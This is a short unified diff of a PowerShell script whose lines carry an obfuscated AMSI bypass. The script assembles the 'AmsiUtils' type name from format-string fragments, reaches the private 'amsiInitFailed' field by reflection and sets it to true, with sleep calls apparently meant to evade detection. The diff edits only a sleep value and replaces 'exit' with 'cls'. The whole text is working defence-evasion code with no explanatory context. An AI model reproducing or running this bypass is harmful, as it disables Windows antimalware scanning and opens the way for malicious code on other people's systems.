@@ -3,6 +3,6 @@ sleep 5
 $assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
 sleep 5
 $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
-sleep 
+sleep 5
 $field.SetValue($null,$true)
-exit
+cls
